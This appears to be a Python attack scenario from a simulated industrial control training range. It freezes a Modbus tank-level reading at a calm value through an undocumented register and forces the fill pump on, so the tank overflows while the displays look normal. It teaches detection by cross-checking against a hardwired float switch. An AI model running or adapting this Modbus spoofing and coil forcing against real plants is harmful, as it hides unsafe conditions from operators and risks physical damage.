#!/usr/bin/env python3
"""S05 — Manipulation of view (flagship).

Freezes the analog level transmitter (LT_101) at a comfortable-looking
value, then forces the fill pump on — the same coil writes S03 uses — so
the tank genuinely overflows while every screen still reads normal. This
directly reproduces the observed 2026 TTP: disabled safety functions and
falsified displays, operator sees nothing wrong while equipment runs
unsafe.

LT_101 can't be attacked the way S03 attacks P101_RUN: it's a Modbus
input register (FC04), and the protocol has no write function code that
targets input registers at all — there's no "unauthorized write" to make
here. The lie has to be injected at the reporting device itself, via an
undocumented register that isn't part of the published point map
(plc/modbus-map.yml) or any legitimate operator screen. In this
scenario's fiction, an attacker only learns it exists via S02-style
project file exfiltration — reconnaissance, not exploitation.

The hardwired high-high float (LSHH_101) can't be lied to this way: it's
a separate, independent measurement, and this attack never touches it.
That's the entire teaching point. An analyst who trusts LT_101 sees a
calm dashboard. An analyst who cross-checks it against LSHH_101 sees a
tank that is, physically, almost full — and those two facts cannot both
be true.

ATT&CK for ICS: T0832 Manipulation of View, T0856 Spoof Reporting
Message, T0815 Denial of View.

Simulated range only. See SECURITY.md.
"""

from __future__ import annotations

import argparse
import sys
import time

from pymodbus.client import ModbusTcpClient

from attacker.common.scope import guard
from common.pointmap import load as load_pointmap
from process_sim.server import LT101_SPOOF_HR_INDEX

SCENARIO = "S05 — manipulation of view"
DEFAULT_PORT = 5502
SPOOF_TARGET_PCT = 50.0  # a comfortable, unremarkable-looking number


class Session:
    """Thin point-map-aware wrapper so the attack reads like the writeup."""

    def __init__(self, client: ModbusTcpClient) -> None:
        self.client = client
        self.pm = load_pointmap()

    def read(self, tag: str) -> bool | float:
        p = self.pm[tag]
        if p.table == "coils":
            return bool(self.client.read_coils(p.index, count=1).bits[0])
        if p.table == "discrete_inputs":
            return bool(self.client.read_discrete_inputs(p.index, count=1).bits[0])
        if p.table == "input_registers":
            return p.decode(self.client.read_input_registers(p.index, count=1).registers[0])
        if p.table == "holding_registers":
            return p.decode(self.client.read_holding_registers(p.index, count=1).registers[0])
        raise ValueError(p.table)

    def write_coil(self, tag: str, value: bool) -> None:
        self.client.write_coil(self.pm[tag].index, value)


def run(host: str, port: int, timeout_s: float, poll_s: float, source_ip: str | None = None) -> int:
    target = guard(host, port, SCENARIO)

    source_address = (source_ip, 0) if source_ip else None
    client = ModbusTcpClient(target.connect_host, port=target.port, source_address=source_address)
    if not client.connect():
        print(f"[!] could not connect to {target.connect_host}:{target.port}")
        return 1

    session = Session(client)
    try:
        level = session.read("LT_101")
        print(f"[*] baseline: LT_101 reports level={level:.1f}%")

        spoof_raw = round(SPOOF_TARGET_PCT * 100)
        print(f"[*] writing undocumented register {LT101_SPOOF_HR_INDEX} = {spoof_raw}")
        print(f"    (freezes LT_101 at {SPOOF_TARGET_PCT:.1f}% regardless of the real level —")
        print("     this register isn't in plc/modbus-map.yml or on any operator screen)")
        client.write_register(LT101_SPOOF_HR_INDEX, spoof_raw)

        print("[*] writing MODE_AUTO = 0, P101_RUN = 1  (same as S03 — force the pump on)")
        session.write_coil("MODE_AUTO", False)
        session.write_coil("P101_RUN", True)

        print("[*] holding, watching the gap between what's reported and what's real...")
        deadline = time.time() + timeout_s
        started = time.time()
        lshh_tripped_at: float | None = None
        overflow_reported = False  # LT_101 never says this, by construction

        while time.time() < deadline:
            session.write_coil("P101_RUN", True)

            reported_level = session.read("LT_101")
            lshh = session.read("LSHH_101")
            alarm = session.read("ALARM_HORN")
            elapsed = time.time() - started

            if reported_level >= 100.0:
                overflow_reported = True  # would mean the spoof failed

            if lshh and lshh_tripped_at is None:
                lshh_tripped_at = elapsed
                print(
                    f"  [{elapsed:6.1f}s] LSHH_101 (hardwired) TRIPPED — tank is physically "
                    f"almost full — LT_101 (reported) still says {reported_level:.1f}%"
                )
                break

            print(
                f"  [{elapsed:6.1f}s] LT_101(reported)={reported_level:5.1f}%  "
                f"LSHH(hardwired)={lshh}  ALARM_HORN={alarm}"
            )
            time.sleep(poll_s)

        print("\n[+] impact summary")
        print(f"    LT_101 ever left {SPOOF_TARGET_PCT:.0f}%   : {overflow_reported}")
        print(f"    LSHH_101 physically tripped : {'yes' if lshh_tripped_at else 'no'}", end="")
        print(f"  (at {lshh_tripped_at:.1f}s)" if lshh_tripped_at else "")
        print(
            "\n[i] The reported level never moved. The hardwired float did — because\n"
            "    it can't be lied to over the network. Every screen and every log that\n"
            "    trusts LT_101 alone would show a calm, unremarkable pump station."
        )
        return 0 if (lshh_tripped_at and not overflow_reported) else 1
    finally:
        client.close()


def parse_args(argv: list[str] | None = None) -> argparse.Namespace:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--port", type=int, default=DEFAULT_PORT)
    parser.add_argument(
        "--timeout", type=float, default=120.0, help="Give up after this many seconds"
    )
    parser.add_argument("--poll", type=float, default=2.0, help="Seconds between status polls")
    parser.add_argument(
        "--source-ip",
        default=None,
        help="Bind this source address, so the attacker is distinguishable from the HMI",
    )
    return parser.parse_args(argv)


def main() -> int:
    args = parse_args()
    return run(args.host, args.port, args.timeout, args.poll, args.source_ip)


if __name__ == "__main__":
    sys.exit(main())
